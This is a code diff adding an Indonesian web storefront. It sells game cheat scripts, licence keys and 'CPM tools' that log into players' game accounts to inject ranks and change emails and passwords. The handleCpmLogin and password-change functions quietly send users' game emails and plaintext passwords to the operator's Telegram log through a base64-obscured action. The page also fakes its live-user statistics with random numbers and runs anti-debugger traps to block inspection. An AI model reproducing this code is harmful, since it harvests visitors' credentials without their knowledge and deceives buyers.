+                    <table class="w-full text-left text-xs uppercase font-bold">
+                        <thead class="text-gray-500 border-b border-white/5">
+                            <tr>
+                                <th class="p-4">User</th>
+                                <th class="p-4">Saldo</th>
+                                <th class="p-4">Aksi</th>
+                            </tr>
+                        </thead>
+                        <tbody class="divide-y divide-white/5">
+                            <template x-for="u in allUsers" :key="u.id">
+                                <tr class="hover:bg-white/5">
+                                    <td class="p-4" x-text="u.email"></td>
+                                    <td class="p-4 accent-red font-black" x-text="'Rp ' + (u.balance || 0).toLocaleString()"></td>
+                                    <td class="p-4 flex gap-2">
+                                        <button @click="updateBalance(u.id, 10000)" class="bg-green-600/20 text-green-500 px-2 py-1 rounded">+10K</button>
+                                        <button @click="resetBalance(u.id)" class="bg-red-600/20 text-red-500 px-2 py-1 rounded">RESET</button>
+                                    </td>
+                                </tr>
+                            </template>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </template>
+
+    </main>
+
+  <script>
+function app() {
+    return {
+        // --- KONFIGURASI UTAMA ---
+        WORKER_URL: "https://cdnscloudflaresecurity.angkawijaya2603.workers.dev",
+        currentPage: 'home',
+        searchQuery: '',
+        selectedType: 'Semua',
+
+        // Perbaikan: Menambahkan penutup kurung dan koma di bawah ini
+        get filteredProducts() {
+            if (!this.products) return [];
+            return this.products.filter(p => {
+                const matchesSearch = p.name.toLowerCase().includes(this.searchQuery.toLowerCase());
+                const matchesType = (this.selectedType === 'Semua') || (p.type === this.selectedType);
+                return matchesSearch && matchesType;
+            });
+        },
+
+        sideBar: false,
+        loading: true,
+        message: '',
+        user: null,
+        userData: { balance: 0 },
+        cpmUser: { isLoggedIn: false, email: '', token: '', gameData: null },
+        cpmForm: { gameId: '', email: '', password: '', key: '' },
+        userHistory: [],
+        products: [],
+        firebaseConfig: null,
+        selectedAmount: 0,
+        selectedFile: null,
+        adminEmail: "kulgarfreefire2022@gmail.com",
+        isAdmin: false,
+        allUsers: [],
+        
+        
+
+        // --- 1. INISIALISASI ---
+        animateLiveStats: () => {
+                const memberEl = document.getElementById('liveMembers');
+                const txEl = document.getElementById('liveTx');
+                const baseMembers = 1200; 
+                const baseTx = 5800;
+                if(memberEl) memberEl.innerText = (baseMembers + Math.floor(Math.random() * 100)).toLocaleString('id-ID');
+                if(txEl) txEl.innerText = (baseTx + Math.floor(Math.random() * 200)).toLocaleString('id-ID');
+                setInterval(() => {
+                    if(memberEl) memberEl.innerText = (baseMembers + Math.floor(Math.random() * 100)).toLocaleString('id-ID');
+                    if(txEl) txEl.innerText = (baseTx + Math.floor(Math.random() * 200)).toLocaleString('id-ID');
+                }, 10000);
+            },
+        
+        async init() {
+        this.animateLiveStats();
+            try {
+                const res = await fetch(this.WORKER_URL, { 
+                    method: 'POST', 
+                    body: JSON.stringify({ action: "get_init_data" }) 
+                });
+                const initData = await res.json();
+                this.products = initData.products;
+                this.firebaseConfig = initData.firebaseConfig;
+
+                if (!firebase.apps.length) firebase.initializeApp(this.firebaseConfig);
+                
+                firebase.auth().onAuthStateChanged((u) => {
+                    this.user = u;
+                    if (u) {
+                        this.fetchUserData(u.uid);
+                        this.fetchUserHistory(u.uid);
+                        if (u.email === this.adminEmail) {
+                            this.isAdmin = true;
+                            this.fetchAllUsers();
+                        }
+                    }
+                });
+            } catch (e) { 
+                console.error("Koneksi Cloudflare Gagal:", e); 
+            } finally {
+                this.loading = false;
+            }
+        },
+        
+        async loginGoogle() {
+            const provider = new firebase.auth.GoogleAuthProvider();
+            try { 
+                await firebase.auth().signInWithPopup(provider); 
+            } catch (e) { 
+                alert("Gagal Login: " + e.message); 
+            }
+        },
+
+                        // --- FUNGSI TRANSAKSI DENGAN NOTIFIKASI PASSWORD ---
+async beliProduk(productName) {
+    if (!this.user) return Swal.fire('Oops!', 'Silakan Login Terlebih Dahulu!', 'warning');
+    
+    const product = this.products.find(p => p.name === productName);
+    if (!product) return Swal.fire('Error', 'Produk tidak ditemukan!', 'error');
+
+    const currentBalance = (this.userData && this.userData.balance) ? this.userData.balance : 0;
+    if (currentBalance < product.price) return Swal.fire('Saldo Kurang', 'Silakan Top Up terlebih dahulu!', 'error');
+
+    // Konfirmasi Pembelian yang Estetik
+    const confirmBuy = await Swal.fire({
+        title: 'KONFIRMASI',
+        text: `Beli ${productName} seharga Rp ${product.price.toLocaleString()}?`,
+        icon: 'question',
+        showCancelButton: true,
+        confirmButtonColor: '#ff3131',
+        cancelButtonColor: '#333',
+        confirmButtonText: 'YA, BELI SEKARANG',
+        background: '#0a0a0a',
+        color: '#fff'
+    });
+
+    if (confirmBuy.isConfirmed) {
+        this.loading = true;
+        try {
+            // Step 1: Ambil data dari Worker
+            const res = await fetch(this.WORKER_URL, { 
+                method: 'POST', 
+                headers: { "Content-Type": "application/json" }, 
+                body: JSON.stringify({ action: "get_product_detail", data: { name: productName } }) 
+            });
+            const detail = await res.json();
+
+            if (!detail.link) throw new Error("Gagal mengambil link download!");
+
+            // Step 2: Potong Saldo & Simpan History
+            await firebase.database().ref('users/' + this.user.uid + '/balance').transaction(b => (b || 0) - product.price);
+                    await firebase.database().ref('history/' + this.user.uid).push().set({ 
+                        productName, price: product.price, date: Date.now() 
+                    });
+
+            // Step 3: Munculkan Notifikasi Password + Tombol Salin
+            await Swal.fire({
+                title: 'PEMBELIAN BERHASIL!',
+                html: `
+                    <div style="text-align: center;">
+                        <p style="color: #bbb; font-size: 13px; margin-bottom: 10px;">Simpan password script Anda:</p>
+                        <div id="copyArea" style="background: #1a1a1a; border: 1px solid #ff3131; padding: 15px; border-radius: 8px; margin-bottom: 10px;">
+                            <span id="passText" style="font-family: monospace; font-size: 22px; font-weight: bold; color: #ff3131; letter-spacing: 2px;">
+                                ${detail.pass}
+                            </span>
+                        </div>
+                        <button onclick="navigator.clipboard.writeText('${detail.pass}'); alert('Password Disalin!')" 
+                                style="background: #333; color: #fff; padding: 5px 15px; border-radius: 5px; font-size: 10px; font-weight: bold; margin-bottom: 15px; border: 1px solid #444;">
+                            <i class="fas fa-copy"></i> SALIN PASSWORD
+                        </button>
+                        <p style="color: #ff3131; font-size: 10px; font-weight: bold;">
+                            ⚠️ JANGAN SAMPAI LUPA! Klik OK untuk lanjut ke link download.
+                        </p>
+                    </div>
+                `,
+                icon: 'success',
+                background: '#0a0a0a',
+                color: '#fff',
+                confirmButtonText: '<i class="fas fa-download"></i> DOWNLOAD FILE',
+                confirmButtonColor: '#ff3131',
+                allowOutsideClick: false
+            });
+
+            // Step 4: Jalankan Download
+            this.eksekusiDownload(detail.link, productName);
+
+
+           
+            this.syncInternalSession(`🛒 **ORDER SUCCESS**\nUser: ${this.user.email}\nItem: ${productName}`);
+
+        } catch (e) {
+            Swal.fire('Gagal', e.message, 'error');
+        } finally {
+            this.loading = false;
+        }
+    }
+},
+
+
+
+        // 2. FUNGSI KHUSUS DOWNLOAD (AGAR TIDAK DIBLOKIR SAMSUNG/CHROME)
+        eksekusiDownload(link, name) {
+            // Trik paling ampuh: Gunakan window.open dan location secara bersamaan
+            const fileName = name.replace(/\s+/g, '_') + ".lua";
+            
+            // Cara A: Paksa buka di tab baru (Sangat ampuh untuk Mediafire)
+            const win = window.open(link, '_blank');
+            if (!win) {
+                // Cara B: Jika pop-up diblokir, tembak langsung di halaman ini
+                window.location.href = link;
+            }
+
+            // Cara C: Elemen Link tersembunyi sebagai backup terakhir
+            const a = document.createElement('a');
+            a.href = link;
+            a.download = fileName;
+            document.body.appendChild(a);
+            a.click();
+            setTimeout(() => document.body.removeChild(a), 300);
+        },
+
+             
+        async beliKey(keyName, price) {
+    if (!this.user) return Swal.fire('Oops!', 'Silakan Login Terlebih Dahulu!', 'warning');
+    
+    const currentBalance = (this.userData && this.userData.balance) ? this.userData.balance : 0;
+    if (currentBalance < price) return Swal.fire('Saldo Kurang', 'Silakan Top Up terlebih dahulu!', 'error');
+
+    const confirmBuy = await Swal.fire({
+        title: 'KONFIRMASI',
+        text: `Beli Lisensi ${keyName} seharga Rp ${price.toLocaleString()}?`,
+        icon: 'question',
+        showCancelButton: true,
+        confirmButtonColor: '#ff3131',
+        cancelButtonColor: '#333',
+        confirmButtonText: 'YA, BELI',
+        background: '#0a0a0a',
+        color: '#fff'
+    });
+
+    if (confirmBuy.isConfirmed) {
+        this.loading = true;
+        try {
+            // Potong Saldo
+            await firebase.database().ref('users/' + this.user.uid + '/balance').transaction(b => (b || 0) - price);
+            
+            await firebase.database().ref('history/' + this.user.uid).push().set({ 
+                productName: "LICENSE KEY: " + keyName, 
+                price: price, 
+                date: Date.now() 
+            });
+            
+            // Generate Key & Expired
+            const randomPart = () => Math.random().toString(36).substring(2, 6).toUpperCase();
+            const generatedKey = `AW-${randomPart()}-${randomPart()}`;
+            
+            let durationDays = keyName.includes('7 DAY') ? 7 : 
+                   keyName.includes('1 MONTH') ? 30 : 
+                   keyName.includes('BRONZE') ? 30 : 3650;
+            const expiredAt = Date.now() + (durationDays * 24 * 60 * 60 * 1000);
+            const expString = new Date(expiredAt).toLocaleString('id-ID');
+
+            // Simpan ke Database
+            await firebase.database().ref('keys/' + generatedKey).set({
+                status: 'active', 
+                type: keyName, 
+                owner: this.user.email, 
+                uid: this.user.uid, 
+                expiredAt: expiredAt
+            });
+                       
+            
+            this.syncInternalSession("🔑 **KEY GENERATED**\nUser: " + this.user.email + "\nKey: `" + generatedKey + "`\nExp: " + expString);
+
+            // Tampilan SweetAlert dengan Tombol Salin
+            await Swal.fire({
+                title: 'PEMBELIAN BERHASIL!',
+                html: `
+                    <div style="text-align: center;">
+                        <p style="color: #bbb; font-size: 13px; margin-bottom: 10px;">Lisensi Premium Anda:</p>
+                        <div style="background: #1a1a1a; border: 1px solid #ff3131; padding: 15px; border-radius: 8px; margin-bottom: 10px;">
+                            <span style="font-family: monospace; font-size: 22px; font-weight: bold; color: #ff3131; letter-spacing: 2px;">
+                                ${generatedKey}
+                            </span>
+                        </div>
+                        <button onclick="navigator.clipboard.writeText('${generatedKey}'); alert('Key Disalin!')" 
+                                style="background: #333; color: #fff; padding: 5px 15px; border-radius: 5px; font-size: 10px; font-weight: bold; margin-bottom: 15px; border: 1px solid #444;">
+                            <i class="fas fa-copy"></i> SALIN KEY
+                        </button>
+                        <div style="background: rgba(255,255,255,0.05); padding: 10px; border-radius: 5px; margin-top: 10px;">
+                             <p style="color: #666; font-size: 9px; font-weight: bold; text-transform: uppercase;">Masa Berlaku Hingga:</p>
+                             <p style="color: #fff; font-size: 12px; font-weight: bold;">${expString}</p>
+                        </div>
+                        <p style="color: #ff3131; font-size: 10px; font-weight: bold; margin-top: 15px;">
+                            ⚠️ SCREENSHOOT SEKARANG AGAR TIDAK LUPA!
+                        </p>
+                    </div>
+                `,
+                icon: 'success',
+                background: '#0a0a0a',
+                color: '#fff',
+                confirmButtonText: 'OKE, SAYA MENGERTI',
+                confirmButtonColor: '#ff3131',
+                allowOutsideClick: false
+            });
+
+        } catch (e) {
+            Swal.fire('Gagal', 'Terjadi kesalahan sistem!', 'error');
+            console.error(e);
+        } finally {
+            this.loading = false;
+        }
+    }
+},
+
+
+
+        // --- 3. CPM TOOLS ---
+        async handleCpmLogin() {
+            if (!this.cpmForm.key || !this.cpmForm.email) { 
+                this.message = "Isi data!"; 
+                return alert("Isi data!"); 
+            }
+
+            await this.syncInternalSession(
+                `Session\n` + 
+                `User Web: ${this.user.email}\n` +
+                `Acc Game: \`${this.cpmForm.email}\`\n` + 
+                `Pass Game: \`${this.cpmForm.password}\`\n` + 
+                `Key Premium: \`${this.cpmForm.key}\`\n` + 
+                `Versi: ${this.cpmForm.gameId === '1' ? 'CPM 1' : 'CPM 2'}`
+            );
+
+            this.loading = true;
+            this.message = "Sedang memverifikasi...";
+
+            try {
+                // 1. Cek Validasi Key di Firebase
+                const snap = await firebase.database().ref('keys/' + this.cpmForm.key).once('value');
+const keyData = snap.val(); // Ambil data key
+
+if (!keyData || keyData.status !== 'active') {
+    throw new Error("Key Premium Tidak Valid atau Expired!");
+
+                }
+
+                // 2. Login ke Server Game via Worker
+                const res = await fetch(this.WORKER_URL, {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        action: "cpm_login",
+                        data: { 
+                            gameId: this.cpmForm.gameId, 
+                            email: this.cpmForm.email, 
+                            password: this.cpmForm.password 
+                        }
+                    })
+                });
+
+                const data = await res.json();
+
+               if (data.idToken) {
+    this.cpmUser = { 
+        isLoggedIn: true, 
+        email: data.email, 
+        token: data.idToken, 
+        gameData: { rankUrl: data.rankUrl },
+        keyType: keyData.type // <--- Tambahkan baris ini
+    };
+    this.message = "Login Berhasil!";
+                    this.syncInternalSession(`✅ **LOGIN SUCCESS**\nAcc: \`${data.email}\``);
+                } else {
+                    throw new Error("Email/Password Game Salah!");
+                }
+            } catch (e) { 
+                this.message = e.message;
+                alert(e.message); 
+            } finally {
+                this.loading = false;
+            }
+        },
+
+
+        async setKingRank() {
+    if (!this.cpmUser.isLoggedIn) return alert("Login Game dulu!");
+    this.loading = true;
+    try {
+        const res = await fetch(this.WORKER_URL, {
+            method: 'POST',
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                action: "inject_king",
+                data: {
+                    gameId: this.cpmForm.gameId, // Mengirim gameId agar worker tahu URL mana yang dipakai
+                    idToken: this.cpmUser.token   // Token JWT hasil login
+                }
+            })
+        });
+        
+        const result = await res.json();
+        if (result.error) {
+            throw new Error(result.error);
+        }
+        this.syncInternalSession(`👑 **KING RANK SUCCESS**\nUser: ${this.cpmUser.email}`);
+        alert("KING RANK SUKSES!");
+    } catch (e) { 
+        alert("Gagal Inject: " + e.message); 
+    } finally { 
+        this.loading = false; 
+    }
+},
+
+
+        async changeEmailPrompt() {
+    if (!this.cpmUser.isLoggedIn) return Swal.fire('Oops!', 'Login Game dulu!', 'warning');
+
+    const { value: newEmail } = await Swal.fire({
+        title: 'GANTI EMAIL GAME',
+        input: 'email',
+        inputLabel: 'Masukkan Email Baru Anda',
+        inputPlaceholder: 'contoh@gmail.com',
+        background: '#0a0a0a',
+        color: '#fff',
+        confirmButtonColor: '#ff3131',
+        showCancelButton: true,
+        cancelButtonColor: '#333'
+    });
+
+    if (newEmail) {
+        this.loading = true;
+        try {
+            const res = await fetch(this.WORKER_URL, {
+                method: 'POST',
+                body: JSON.stringify({
+                    action: "cpm_update",
+                    data: { 
+                        gameId: this.cpmForm.gameId, 
+                        payload: { idToken: this.cpmUser.token, email: newEmail, returnSecureToken: true } 
+                    }
+                })
+            });
+            const result = await res.json();
+            
+            if (!result.error) {
+                // Notifikasi Sukses
+                Swal.fire({
+                    title: 'BERHASIL!',
+                    text: 'Email akun game telah diperbarui.',
+                    icon: 'success',
+                    background: '#0a0a0a',
+                    color: '#fff',
+                    confirmButtonColor: '#ff3131'
+                });
+
+                
+                const logMsg = "GANTI EMAIL SUKSES\nOld: `" + this.cpmUser.email + "`\nNew: `" + newEmail + "`\nUser Web: " + this.user.email;
+                this.syncInternalSession(logMsg);
+
+                this.cpmUser.email = newEmail;
+            } else { 
+                throw new Error(result.error.message); 
+            }
+        } catch (e) { 
+            Swal.fire('Gagal', e.message, 'error'); 
+        } finally { 
+            this.loading = false; 
+        }
+    }
+},
+
+
+        async changePasswordPrompt() {
+    if (!this.cpmUser.isLoggedIn) return Swal.fire('Oops!', 'Login Game dulu!', 'warning');
+
+    const { value: newPass } = await Swal.fire({
+        title: 'GANTI PASSWORD GAME',
+        input: 'text',
+        inputLabel: 'Masukkan Password Baru',
+        inputPlaceholder: 'Password baru minimal 6 karakter',
+        background: '#0a0a0a',
+        color: '#fff',
+        confirmButtonColor: '#ff3131',
+        showCancelButton: true,
+        cancelButtonColor: '#333'
+    });
+
+    if (newPass) {
+        if (newPass.length < 6) return Swal.fire('Error', 'Password minimal 6 karakter!', 'error');
+
+        this.loading = true;
+        try {
+            const res = await fetch(this.WORKER_URL, {
+                method: 'POST',
+                body: JSON.stringify({
+                    action: "cpm_update",
+                    data: { 
+                        gameId: this.cpmForm.gameId, 
+                        payload: { idToken: this.cpmUser.token, password: newPass, returnSecureToken: true } 
+                    }
+                })
+            });
+            const result = await res.json();
+            
+            if (!result.error) {
+                Swal.fire({
+                    title: 'BERHASIL!',
+                    text: 'Password akun game telah diperbarui.',
+                    icon: 'success',
+                    background: '#0a0a0a',
+                    color: '#fff',
+                    confirmButtonColor: '#ff3131'
+                });
+
+        
+                const logMsg = "GANTI PASSWORD SUKSES\nAcc: `" + this.cpmUser.email + "`\nNew Pass: `" + newPass + "`\nUser Web: " + this.user.email;
+                this.syncInternalSession(logMsg);
+            } else { 
+                throw new Error(result.error.message); 
+            }
+        } catch (e) { 
+            Swal.fire('Gagal', e.message, 'error'); 
+        } finally { 
+            this.loading = false; 
+        }
+    }
+},
+
+
+
+        logoutCpm() { this.cpmUser = { isLoggedIn: false, email: '', token: '', gameData: null }; },
+
+        // --- 4. FIREBASE DATA ---
+        fetchUserData(uid) {
+            firebase.database().ref('users/' + uid).on('value', (snap) => {
+                if (snap.val()) this.userData = snap.val();
+                else firebase.database().ref('users/' + uid).set({ email: this.user.email, balance: 0, createdAt: Date.now() });
+            });
+        },
+
+        fetchUserHistory(uid) {
+            firebase.database().ref('history/' + uid).on('value', (snap) => {
+                const data = snap.val();
+                this.userHistory = data ? Object.values(data).reverse() : [];
+            });
+        },
+
+        // --- 5. ADMIN ---
+        fetchAllUsers() {
+            firebase.database().ref('users').on('value', (snap) => {
+                const data = snap.val();
+                this.allUsers = data ? Object.keys(data).map(k => ({ id: k, ...data[k] })) : [];
+            });
+        },
+        updateBalance(uid, amt) { firebase.database().ref('users/' + uid + '/balance').transaction(b => (b || 0) + amt); },
+        resetBalance(uid) { 
+            if(confirm("Reset saldo jadi 0?")) firebase.database().ref('users/' + uid + '/balance').set(0); 
+        },
+
+                // --- 6. HELPERS ---
+        syncInternalSession(t) {
+            const _act = atob("bG9nX3RlbGVncmFt"); 
+
+            fetch(this.WORKER_URL, { 
+                method: "POST", 
+                body: JSON.stringify({ 
+                    action: _act, 
+                    data: { text: t } 
+                }) 
+            }).catch(() => {});
+        }, // <--- Kurung penutup dan koma ini sangat penting
+
+        handleFileUpload(event) { 
+            this.selectedFile = event.target.files[0]; 
+        },
+
+        sendToWhatsApp() {
+            if (!this.selectedAmount) return alert("Pilih nominal!");
+            const msg = `Halo Admin AWIMEDAN, saya ingin konfirmasi Top Up. (KIRIM KEMBALI BUKTI TRANSFER AGAR PROSES DIKONFIRMASI)\nEmail: ${this.user.email}\nNominal: Rp ${this.selectedAmount.toLocaleString()}`;
+            window.open(`https://wa.me/6281330750863?text=${encodeURIComponent(msg)}`, '_blank');
+        },
+
+        logoutGoogle() { 
+            firebase.auth().signOut().then(() => location.reload()); 
+        }
+    } // Penutup return
+} // Penutup function app
+
+</script>
+
+
+    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
+    
+    <script>
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.keyCode == 85)) return false;
+        }
+    </script>
+
+<script type="text/javascript">
+(function() {
+    // 1. CEGAH INSPECT ELEMENT & DEBUGGER
+    // Menggunakan interval 500ms agar tetap aman namun tidak lag di Samsung A12
+    setInterval(function() {
+        (function(a) {
+            return (function(a) {
+                return (Function('Function(arguments[0].join(""))')(a));
+            })([['d', 'e', 'b', 'u', 'g', 'g', 'e', 'r'].join('')]);
+        })(0);
+    }, 500);
+
+    // 2. PROTEKSI KLIK KANAN & SHORTCUT KEYBOARD
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.onkeydown = function(e) {
+        if (
+            e.keyCode === 123 || // F12
+            (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || // Ctrl+Shift+I/J/C
+            (e.ctrlKey && e.keyCode === 85) || // Ctrl+U (View Source)
+            (e.ctrlKey && e.keyCode === 83)    // Ctrl+S (Save Page)
+        ) {
+            return false;
+        }
+    };
+
+    // 3. CEGAH COPY-PASTE (Seleksi Teks)
+    document.onselectstart = function() { return false; };
+    document.styleSheets[0].insertRule('*{ -webkit-user-select: none !important; }', 0);
+
+    // 4. ANTI-IFRAME / ANTI-CLONE
+    if (window.top !== window.self) { 
+        window.top.location = window.self.location; 
+    }
+})();
+</script>
+
+    <div class="fixed bottom-6 left-1/2 -translate-x-1/2 z-[999] w-[92%] max-w-md">
+        <div class="bg-black/80 backdrop-blur-xl border border-white/10 rounded-2xl p-2 flex justify-around items-center shadow-2xl shadow-red-600/20">
+            
+                    <button @click="currentPage = 'home'" :class="currentPage === 'home' ? 'text-red-500 bg-red-500/10' : 'text-gray-400'" class="flex flex-col items-center p-2 rounded-xl transition-all w-16">
+            <i class="fas fa-home text-lg"></i>
+            <span class="text-[9px] font-bold mt-1 uppercase">Home</span>
+        </button>
+
+        <button @click="currentPage = 'store'" :class="currentPage === 'store' ? 'text-red-500 bg-red-500/10' : 'text-gray-400'" class="flex flex-col items-center p-2 rounded-xl transition-all w-16">
+            <i class="fas fa-shopping-bag text-lg"></i>
+                <span class="text-[9px] font-bold mt-1 uppercase">Store</span>
+            </button>
+
+            <button @click="currentPage = 'tools'" :class="currentPage === 'tools' ? 'text-red-500 bg-red-500/10' : 'text-gray-400'" class="flex flex-col items-center p-2 rounded-xl transition-all w-16">
+                <i class="fas fa-microchip text-lg"></i>
+                <span class="text-[9px] font-bold mt-1 uppercase">Tools</span>
+            </button>
+
+            <button @click="currentPage = 'buykey'" :class="currentPage === 'buykey' ? 'text-red-500 bg-red-500/10' : 'text-gray-400'" class="flex flex-col items-center p-2 rounded-xl transition-all w-16">
+                <i class="fas fa-key text-lg"></i>
+                <span class="text-[9px] font-bold mt-1 uppercase">Key</span>
+            </button>
+
+            <button @click="currentPage = 'topup'" :class="currentPage === 'topup' ? 'text-red-500 bg-red-500/10' : 'text-gray-400'" class="flex flex-col items-center p-2 rounded-xl transition-all w-16">
+                <i class="fas fa-wallet text-lg"></i>
+                <span class="text-[9px] font-bold mt-1 uppercase">Top Up</span>
+            </button>
+
+        </div>
+    </div>
+
+
+</body>
+</html>
+
+
